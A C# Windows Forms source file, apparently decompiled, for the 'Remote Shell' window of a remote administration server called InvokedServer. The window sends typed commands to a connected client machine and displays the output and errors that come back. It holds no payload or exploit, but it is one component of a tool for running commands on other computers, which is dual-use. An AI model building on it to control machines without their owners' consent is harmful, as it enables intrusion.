

using System;
using System.Collections.Generic;
using System.Drawing;
using System.Windows.Forms;
using InvokedCommon.Messages;
using InvokedServer.Helper;
using InvokedServer.Messages;
using InvokedServer.Networking;


namespace InvokedServer.Forms
{
	public partial class FrmRemoteShell : Form
	{
		private readonly Client _connectClient;
		public readonly RemoteShellHandler RemoteShellHandler;
		private static readonly Dictionary<Client, FrmRemoteShell> OpenedForms = new Dictionary<Client, FrmRemoteShell>();

		public static FrmRemoteShell CreateNewOrGetExisting(Client client)
		{
			if (FrmRemoteShell.OpenedForms.ContainsKey(client))
				return FrmRemoteShell.OpenedForms[client];
			FrmRemoteShell newOrGetExisting = new FrmRemoteShell(client);
			newOrGetExisting.Disposed += (EventHandler)((sender, args) => FrmRemoteShell.OpenedForms.Remove(client));
			FrmRemoteShell.OpenedForms.Add(client, newOrGetExisting);
			return newOrGetExisting;
		}

		public FrmRemoteShell(Client client)
		{
			this._connectClient = client;
			this.RemoteShellHandler = new RemoteShellHandler(client);
			this.RegisterMessageHandler();
			this.InitializeComponent();
			this.txtConsoleOutput.AppendText(">> Type 'exit' to close this session" + Environment.NewLine);
		}

		private void RegisterMessageHandler()
		{
			this._connectClient.ClientState += new Client.ClientStateEventHandler(this.ClientDisconnected);
			this.RemoteShellHandler.ProgressChanged += new MessageProcessorBase<string>.ReportProgressEventHandler(this.CommandOutput);
			this.RemoteShellHandler.CommandError += new RemoteShellHandler.CommandErrorEventHandler(this.CommandError);
			MessageHandler.Register((IMessageProcessor)this.RemoteShellHandler);
		}

		private void UnregisterMessageHandler()
		{
			MessageHandler.Unregister((IMessageProcessor)this.RemoteShellHandler);
			this.RemoteShellHandler.ProgressChanged -= new MessageProcessorBase<string>.ReportProgressEventHandler(this.CommandOutput);
			this.RemoteShellHandler.CommandError -= new RemoteShellHandler.CommandErrorEventHandler(this.CommandError);
			this._connectClient.ClientState -= new Client.ClientStateEventHandler(this.ClientDisconnected);
		}

		private void CommandOutput(object sender, string output)
		{
			this.txtConsoleOutput.SelectionColor = Color.WhiteSmoke;
			this.txtConsoleOutput.AppendText(output);
		}

		private void CommandError(object sender, string output)
		{
			this.txtConsoleOutput.SelectionColor = Color.Red;
			this.txtConsoleOutput.AppendText(output);
		}

		private void ClientDisconnected(Client client, bool connected)
		{
			if (connected)
				return;
			this.Invoke(new MethodInvoker(((Form)this).Close));
		}

		private void FrmRemoteShell_Load(object sender, EventArgs e)
		{
			this.DoubleBuffered = true;
			this.Text = WindowHelper.GetWindowTitle("Remote Shell", this._connectClient);
		}

		private void FrmRemoteShell_FormClosing(object sender, FormClosingEventArgs e)
		{
			this.UnregisterMessageHandler();
			if (!this._connectClient.Connected)
				return;
			this.RemoteShellHandler.SendCommand("exit");
		}

		private void txtConsoleOutput_TextChanged(object sender, EventArgs e)
		{
			NativeMethodsHelper.ScrollToBottom(this.txtConsoleOutput.Handle);
		}

		private void txtConsoleInput_KeyDown(object sender, KeyEventArgs e)
		{
			if (e.KeyCode != Keys.Return || string.IsNullOrEmpty(this.txtConsoleInput.Text.Trim()))
				return;
			string command = this.txtConsoleInput.Text.TrimStart(' ', ' ').TrimEnd(' ', ' ');
			this.txtConsoleInput.Text = string.Empty;
			string[] strArray1 = command.Split(' ');
			string[] strArray2 = command.Split(' ');
			if (command == "exit" || strArray1.Length != 0 && strArray1[0] == "exit" || strArray2.Length != 0 && strArray2[0] == "exit")
				this.Close();
			else if (command == "cls")
				this.txtConsoleOutput.Text = string.Empty;
			else
				this.RemoteShellHandler.SendCommand(command);
			e.Handled = true;
			e.SuppressKeyPress = true;
		}

		private void txtConsoleOutput_KeyPress(object sender, KeyPressEventArgs e)
		{
			if (e.KeyChar == '\u0002')
				return;
			this.txtConsoleInput.Text += e.KeyChar.ToString();
			this.txtConsoleInput.Focus();
			this.txtConsoleInput.SelectionStart = this.txtConsoleOutput.TextLength;
			this.txtConsoleInput.ScrollToCaret();
		}
	}
}